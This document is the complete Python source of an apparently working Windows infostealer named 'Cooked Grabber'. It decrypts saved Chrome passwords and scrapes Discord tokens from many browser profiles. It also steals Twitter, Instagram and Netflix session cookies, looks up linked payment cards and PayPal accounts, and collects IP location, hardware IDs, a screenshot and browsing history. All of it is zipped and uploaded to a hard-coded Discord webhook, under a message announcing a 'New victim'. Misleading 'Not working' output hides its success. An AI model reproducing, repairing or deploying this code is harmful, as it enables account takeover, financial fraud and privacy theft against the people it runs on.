import os
import sys
import win32con
import browser_cookie3
from json import loads, dumps
from base64 import b64decode
from sqlite3 import connect
from shutil import copyfile
from threading import Thread
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from discord_webhook import DiscordEmbed, DiscordWebhook
from subprocess import Popen, PIPE
from urllib.request import urlopen, Request
from requests import get
from re import findall, search
from win32api import SetFileAttributes, GetSystemMetrics
from browser_history import get_history
from prettytable import PrettyTable
from platform import platform
from getmac import get_mac_address as gma
from psutil import virtual_memory
from collections import defaultdict
from zipfile import ZipFile, ZIP_DEFLATED
from cpuinfo import get_cpu_info
from multiprocessing import freeze_support
from tempfile import TemporaryDirectory
from pyautogui import screenshot
from random import choices
from string import ascii_letters, digits

website = ["discord.com", "twitter.com", "instagram.com", "netflix.com"]


def get_screenshot(path):
    get_screenshot.scrn = screenshot()
    get_screenshot.scrn_path = os.path.join(
        path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png"
    )
    get_screenshot.scrn.save(get_screenshot.scrn_path)


def get_hwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def get_user_data(tk):
    headers = {"Authorization": tk}
    response = get("https://discordapp.com/api/v6/users/@me", headers=headers).json()
    return [
        response["username"],
        response["discriminator"],
        response["email"],
        response["phone"],
    ]


def has_payment_methods(tk):
    headers = {"Authorization": tk}
    response = get(
        "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
        headers=headers,
    ).json()
    return response


def cookies_grabber_mod(u):
    cookies = []
    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
    for browser in browsers:
        try:
            cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
        except BaseException:
            pass
    return cookies


def get_Personal_data():
    try:
        ip_address = urlopen(Request("https://api64.ipify.org")).read().decode().strip()
        country = (
            urlopen(Request(f"https://ipapi.co/{ip_address}/country_name"))
            .read()
            .decode()
            .strip()
        )
        city = (
            urlopen(Request(f"https://ipapi.co/{ip_address}/city"))
            .read()
            .decode()
            .strip()
        )
    except BaseException:
        city = "City not found -_-"
        country = "Country not found -_-"
        ip_address = "No IP found -_-"
    return [ip_address, country, city]


def find_His():
    """Get browser history with error handling"""
    table = PrettyTable(padding_width=1)
    table.field_names = ["CurrentTime", "Link"]
    
    try:
        # Get history with error handling
        history_output = get_history()
        for his in history_output.histories:
            a, b = his
            if len(b) <= 100:
                table.add_row([a, b])
            else:
                x_ = b.split("//")
                if len(x_) > 1:
                    x__, x___ = x_[1].count("/"), x_[1].split("/")
                    if x___ and x___[0] != "www.google.com":
                        if x__ <= 5:
                            b = f"{x_[0]}//"
                            for p in x___:
                                if x___.index(p) != len(x___) - 1:
                                    b += f"{p}/"
                            if len(b) <= 100:
                                table.add_row([a, b])
                            else:
                                table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
                        else:
                            b = f"{x_[0]}//{x___[0]}/[...]"
                            if len(b) <= 100:
                                table.add_row([a, b])
                            else:
                                table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
    except Exception as e:
        # If history can't be fetched, return empty table
        print(f"Browser history error: {e}")
        table.add_row(["Error", "Could not fetch browser history"])
    
    return table.get_string()


def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State",
    )
    if not os.path.exists(local_state_path):
        return None
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = loads(f.read())
    
    try:
        return CryptUnprotectData(
            b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0
        )[1]
    except:
        return None


def decrypt_data(data, key):
    if not key or not data:
        return ""
    
    try:
        return (
            AES.new(
                CryptUnprotectData(key, None, None, None, 0)[1],
                AES.MODE_GCM,
                data[3:15],
            )
            .decrypt(data[15:])[:-16]
            .decode()
        )
    except BaseException:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except BaseException:
            return ""


def main(dirpath):
    db_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "default",
        "Login Data",
    )
    chrome_psw_list = []
    
    if os.path.exists(db_path):
        key = get_encryption_key()
        if key:
            filename = os.path.join(dirpath, "ChromeData.db")
            try:
                copyfile(db_path, filename)
                db = connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for url, user_name, pwd in cursor.fetchall():
                    pwd_db = decrypt_data(pwd, key)
                    if pwd_db:
                        chrome_psw_list.append([user_name, pwd_db, url])
                
                cursor.close()
                db.close()
            except Exception as e:
                print(f"Error accessing Chrome passwords: {e}")

    tokens = []
    cleaned = []

    # FIXED: discord_tokens function with proper error handling
    def discord_tokens(path):
        try:
            local_state_path = os.path.join(path, "Local State")
            key = None
            if os.path.exists(local_state_path):
                with open(local_state_path, "r") as file:
                    key = loads(file.read())["os_crypt"]["encrypted_key"]
        except:
            pass

        local_storage_path = os.path.join(path, "Local Storage", "leveldb")
        
        # Check if the directory exists before trying to list it
        if not os.path.exists(local_storage_path):
            return
        
        try:
            for file in os.listdir(local_storage_path):
                if not (file.endswith(".ldb") or file.endswith(".log")):
                    continue
                
                file_path = os.path.join(local_storage_path, file)
                try:
                    with open(file_path, "r", errors="ignore") as files:
                        content = files.read()
                        # Look for Discord tokens (updated regex pattern)
                        found_tokens = findall(r'dQw4w9WgXcQ:[^\"]*', content)
                        tokens.extend(found_tokens)
                except:
                    pass
        except:
            pass

        # Clean the tokens
        for tkn in tokens:
            if tkn.endswith("\\"):
                tkn = tkn.replace("\\", "")
            if tkn not in cleaned:
                cleaned.append(tkn)

        # Decrypt tokens if we have a key
        if key:
            decrypted_tokens = []
            for token in cleaned:
                try:
                    token_data = token.split("dQw4w9WgXcQ:")
                    if len(token_data) > 1:
                        decrypted = decrypt_data(
                            b64decode(token_data[1]),
                            b64decode(key)[5:]
                        )
                        if decrypted and decrypted not in decrypted_tokens:
                            decrypted_tokens.append(decrypted)
                except:
                    pass
            tokens.extend(decrypted_tokens)

    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    
    # FIXED: Browser paths with proper checking
    paths = []
    potential_paths = [
        os.path.join(roaming, "discord"),
        os.path.join(roaming, "discordcanary"),
        os.path.join(roaming, "Lightcord"),
        os.path.join(roaming, "discordptb"),
        os.path.join(roaming, "Opera Software", "Opera Stable"),
        os.path.join(roaming, "Opera Software", "Opera GX Stable"),
        os.path.join(local, "Amigo", "User Data"),
        os.path.join(local, "Torch", "User Data"),
        os.path.join(local, "Kometa", "User Data"),
        os.path.join(local, "Orbitum", "User Data"),
        os.path.join(local, "CentBrowser", "User Data"),
        os.path.join(local, "7Star", "7Star", "User Data"),
        os.path.join(local, "Sputnik", "Sputnik", "User Data"),
        os.path.join(local, "Vivaldi", "User Data", "Default"),
        os.path.join(local, "Google", "Chrome SxS", "User Data"),
        os.path.join(local, "Google", "Chrome", "User Data", "Default"),
        os.path.join(local, "Epic Privacy Browser", "User Data"),
        os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
        os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
        os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        os.path.join(local, "Iridium", "User Data", "Default"),
    ]
    
    # Only add paths that exist
    for p in potential_paths:
        if os.path.exists(p):
            paths.append(p)

    threads = []

    # FIXED: Thread creation with error handling
    for pth in paths:
        if os.path.exists(pth):
            thread = Thread(target=discord_tokens, args=(pth,))
            threads.append(thread)
    
    # Start and join threads
    for t in threads:
        t.start()
    
    for t in threads:
        t.join()

    # Process other websites
    t_lst, insta_lst, n_lst = [], [], []
    
    for w in website:
        if w == website[1]:  # twitter.com
            t_cookies = cookies_grabber_mod(w)
            for b in t_cookies:
                cookie_list = b.split(", ")
                for y in cookie_list:
                    if search(r"auth_token", y) is not None:
                        token_val = y.split(" ")[1].split("=")[1]
                        if token_val not in t_lst:
                            t_lst.append(token_val)
        
        elif w == website[2]:  # instagram.com
            insta_cookies = cookies_grabber_mod(w)
            browser_ = defaultdict(dict)
            for c in insta_cookies:
                cookie_str = str(c)
                if (search(r"ds_user_id", cookie_str) is not None and 
                    search(r"sessionid", cookie_str) is not None):
                    cookie_items = c.split(", ")
                    for y in cookie_items:
                        if search(r"ds_user_id", y):
                            browser_[insta_cookies.index(c)][0] = y.split("=")[1]
                        elif search(r"sessionid", y):
                            browser_[insta_cookies.index(c)][1] = y.split("=")[1]
            
            for x in browser_.values():
                if 0 in x and 1 in x:
                    insta_lst.append([x[0], x[1]])
        
        elif w == website[3]:  # netflix.com
            n_cookies = cookies_grabber_mod(w)
            for c in n_cookies:
                cookie_items = c.split(", ")
                netflix_cookies = []
                for y in cookie_items:
                    if search(r"NetflixId", y) is not None:
                        data = y.split("=")[1]
                        if len(data) > 80:
                            for cookie in cookie_items:
                                if "=" in cookie:
                                    name, value = cookie.strip().split("=", 1)
                                    netflix_cookies.append({
                                        "domain": website[3],
                                        "name": name,
                                        "value": value
                                    })
                            if netflix_cookies and netflix_cookies not in n_lst:
                                n_lst.append(netflix_cookies)
                            break
    
    # Process payment methods
    all_data_p = []
    for x in tokens:
        try:
            lst_b = has_payment_methods(x)
            if isinstance(lst_b, list):
                for n in range(len(lst_b)):
                    if lst_b[n]["type"] == 1:
                        writable = [
                            lst_b[n]["brand"],
                            lst_b[n]["type"],
                            lst_b[n]["last_4"],
                            lst_b[n]["expires_month"],
                            lst_b[n]["expires_year"],
                            lst_b[n]["billing_address"],
                        ]
                        if writable not in all_data_p:
                            all_data_p.append(writable)
                    elif lst_b[n]["type"] == 2:
                        writable_2 = [
                            lst_b[n]["email"],
                            lst_b[n]["type"],
                            lst_b[n]["billing_address"],
                        ]
                        if writable_2 not in all_data_p:
                            all_data_p.append(writable_2)
        except BaseException:
            pass
    
    # Return all collected data
    return [
        tokens,              # Discord tokens
        t_lst,               # Twitter tokens
        insta_lst,           # Instagram tokens  
        all_data_p,          # Payment methods
        chrome_psw_list,     # Chrome passwords
        n_lst                # Netflix cookies
    ]


def send_webhook(DISCORD_WEBHOOK_URLs):
    p_lst = get_Personal_data()
    cpuinfo = get_cpu_info()
    
    with TemporaryDirectory(dir=".") as td:
        try:
            SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
        except:
            pass
        
        get_screenshot(path=td)
        main_info = main(td)
        
        # Create tables
        discord_T, twitter_T, insta_T, chrome_Psw_t = (
            PrettyTable(padding_width=1) for _ in range(4)
        )
        discord_T.field_names = ["Discord Tokens", "Username", "Email", "Phone"]
        twitter_T.field_names = ["Twitter Tokens [auth_token]"]
        insta_T.field_names = ["ds_user_id", "sessionid"]
        chrome_Psw_t.field_names = ["Username / Email", "password", "website"]
        
        verified_tokens = []
        
        # Process Chrome passwords
        for psw_data in main_info[4]:
            chrome_Psw_t.add_row(psw_data)
        
        # Process Discord tokens
        discord_tokens_list = main_info[0] if isinstance(main_info[0], list) else []
        for t_ in discord_tokens_list:
            try:
                if t_ and isinstance(t_, str) and len(t_) > 20:
                    lst = get_user_data(t_)
                    if lst and len(lst) >= 4:
                        username = f"{lst[0]}#{lst[1]}"
                        discord_T.add_row([t_, username, lst[2], lst[3]])
                        verified_tokens.append(t_)
            except BaseException as e:
                # Skip invalid tokens
                continue
        
        # Process Twitter tokens
        twitter_tokens = main_info[1] if isinstance(main_info[1], list) else []
        for _t in twitter_tokens:
            if _t:
                twitter_T.add_row([_t])
        
        # Process Instagram tokens
        insta_tokens = main_info[2] if isinstance(main_info[2], list) else []
        for _t_ in insta_tokens:
            if _t_ and len(_t_) >= 2:
                insta_T.add_row(_t_)
        
        # Process payment info
        pay_l = []
        payment_data = main_info[3] if isinstance(main_info[3], list) else []
        for _p in payment_data:
            if len(_p) > 1:
                if _p[1] == 1 and len(_p) >= 6:
                    payment_card = PrettyTable(padding_width=1)
                    payment_card.field_names = [
                        "Brand",
                        "Last 4",
                        "Type",
                        "Expiration",
                        "Billing Address",
                    ]
                    payment_card.add_row(
                        [_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]]
                    )
                    pay_l.append(payment_card.get_string())
                elif _p[1] == 2 and len(_p) >= 3:
                    payment_p = PrettyTable(padding_width=1)
                    payment_p.field_names = ["Email", "Type", "Billing Address"]
                    payment_p.add_row([_p[0], "Paypal", _p[2]])
                    pay_l.append(payment_p.get_string())
        
        # Save data to files
        files_names = [
            [os.path.join(td, "Discord Tokens.txt"), discord_T],
            [os.path.join(td, "Twitter Tokens.txt"), twitter_T],
            [os.path.join(td, "Instagram Tokens.txt"), insta_T],
            [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t],
        ]
        
        for x_, y_ in files_names:
            should_write = False
            if y_ == files_names[0][1] and verified_tokens:
                should_write = True
            elif y_ == files_names[1][1] and twitter_tokens:
                should_write = True
            elif y_ == files_names[2][1] and insta_tokens:
                should_write = True
            elif y_ == files_names[3][1] and main_info[4]:
                should_write = True
            
            if should_write:
                try:
                    with open(x_, "w", encoding='utf-8') as wr:
                        wr.write(y_.get_string())
                except Exception as e:
                    print(f"Error writing {x_}: {e}")
        
        # Prepare files for zipping
        all_files = [
            os.path.join(td, "History.txt"),
            get_screenshot.scrn_path,
        ]
        
        # Add payment info file if we have payment data
        if pay_l:
            payment_file = os.path.join(td, "Payment Info.txt")
            try:
                with open(payment_file, "w", encoding='utf-8') as f:
                    for i in pay_l:
                        f.write(f"{i}\n")
                all_files.append(payment_file)
            except Exception as e:
                print(f"Error writing payment info: {e}")
        
        # Add Netflix cookies
        netflix_data = main_info[5] if isinstance(main_info[5], list) else []
        for n in netflix_data:
            try:
                p = os.path.join(td, f"netflix_{netflix_data.index(n)}.json")
                with open(p, "w", encoding='utf-8') as f:
                    f.write(dumps(n, indent=4))
                all_files.append(p)
            except Exception as e:
                print(f"Error writing Netflix data: {e}")
        
        # Save browser history (with error handling)
        try:
            history_content = find_His()
            with open(all_files[0], "w", encoding='utf-8') as f:
                f.write(history_content)
        except Exception as e:
            print(f"Error saving history: {e}")
            # Create empty history file if there's an error
            with open(all_files[0], "w", encoding='utf-8') as f:
                f.write("Could not retrieve browser history\n")
        
        # Create ZIP file
        zip_path = os.path.join(td, "data.zip")
        try:
            with ZipFile(zip_path, mode="w", compression=ZIP_DEFLATED) as zipf:
                for files_path in all_files:
                    if os.path.exists(files_path):
                        zipf.write(files_path, os.path.basename(files_path))
                
                for name_f, _ in files_names:
                    if os.path.exists(name_f):
                        zipf.write(name_f, os.path.basename(name_f))
        except Exception as e:
            print(f"Error creating ZIP file: {e}")
            return
        
        # Send to Discord webhooks
        for URL in DISCORD_WEBHOOK_URLs:
            try:
                webhook = DiscordWebhook(
                    url=URL,
                    username="Cooked Grabber",
                    avatar_url="https://i.postimg.cc/FRdZ5DJV/discord-avatar-128-ABF2-E.png",
                    rate_limit_retry=True
                )
                
                embed = DiscordEmbed(title="New victim !", color="FFA500")
                
                # System info
                pc_username = os.getenv('UserName', 'Unknown')
                pc_name = os.getenv('COMPUTERNAME', 'Unknown')
                os_info = platform()
                
                embed.add_embed_field(
                    name="SYSTEM USER INFO",
                    value=f":pushpin:`PC Username:` **{pc_username}**\n:computer:`PC Name:` **{pc_name}**\n:globe_with_meridians:`OS:` **{os_info}**\n",
                    inline=False,
                )
                
                # IP info
                mac_address = gma()
                if not mac_address or mac_address == "00:00:00:00:00:00":
                    mac_address = "Not available"
                
                embed.add_embed_field(
                    name="IP USER INFO",
                    value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}**\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{mac_address}**\n:wrench:`HWID:` **{get_hwid()}**\n",
                    inline=False,
                )
                
                # Hardware info
                cpu_brand = cpuinfo.get('brand_raw', 'Unknown')
                cpu_speed = "Unknown"
                if 'hz_advertised_friendly' in cpuinfo:
                    try:
                        cpu_speed = f"{round(float(str(cpuinfo['hz_advertised_friendly']).split(' ')[0]), 2)} GHz"
                    except:
                        cpu_speed = "Unknown"
                
                ram_gb = round(virtual_memory().total / (1024.0 ** 3), 2)
                resolution = f"{GetSystemMetrics(0)}x{GetSystemMetrics(1)}"
                
                embed.add_embed_field(
                    name="PC USER COMPONENT",
                    value=f":satellite_orbital:`CPU:` **{cpu_brand} - {cpu_speed}**\n:nut_and_bolt:`RAM:` **{ram_gb} GB**\n:desktop:`Resolution:` **{resolution}**\n",
                    inline=False,
                )
                
                # Account stats
                discord_count = len(verified_tokens)
                twitter_count = len(twitter_tokens)
                insta_count = len(insta_tokens)
                netflix_count = len(netflix_data)
                password_count = len(main_info[4])
                
                embed.add_embed_field(
                    name="ACCOUNT GRABBED",
                    value=f":red_circle:`Discord:` **{discord_count}**\n:purple_circle:`Twitter:` **{twitter_count}**\n:blue_circle:`Instagram:` **{insta_count}**\n:green_circle:`Netflix:` **{netflix_count}**\n:brown_circle:`Account Password Grabbed:` **{password_count}**\n",
                    inline=False,
                )
                
                # Payment info
                has_card = any("Debit or Credit Card" in p for p in pay_l)
                has_paypal = any("Paypal" in p for p in pay_l)
                
                card_e = ":white_check_mark:" if has_card else ":x:"
                paypal_e = ":white_check_mark:" if has_paypal else ":x:"
                
                embed.add_embed_field(
                    name="PAYMENT INFO FOUNDED",
                    value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}",
                    inline=False,
                )
                
                embed.set_footer(text="By Lemon.-_-.#3714 & 0xSpoofed")
                embed.set_timestamp()
                
                # Add ZIP file
                try:
                    with open(zip_path, "rb") as f:
                        zip_data = f.read()
                        if zip_data:
                            webhook.add_file(
                                file=zip_data,
                                filename=f"Cooked-Grabber-{pc_username}.zip",
                            )
                except Exception as e:
                    print(f"Error reading ZIP file: {e}")
                
                webhook.add_embed(embed)
                response = webhook.execute()
                
                if response:
                    print(f"Not working.")
                else:
                    print(f"Not working..")
                
            except Exception as e:
                print(f"Not working... : {e}")


if __name__ == "__main__":
    freeze_support()
    try:
        if len(sys.argv) == 1:
            send_webhook(["https://discord.com/api/webhooks/1446961883080036493/Kq5K0mVJB3IFhiu-1muN_4o1Bd-W87FkxiVdtYzsU7maVMHyCXKki-HZ5iZM0SsNQfcx"])
        else:
            del sys.argv[0]
            send_webhook(sys.argv)
    except Exception as e:
        print(f"Fatal error: {e}")
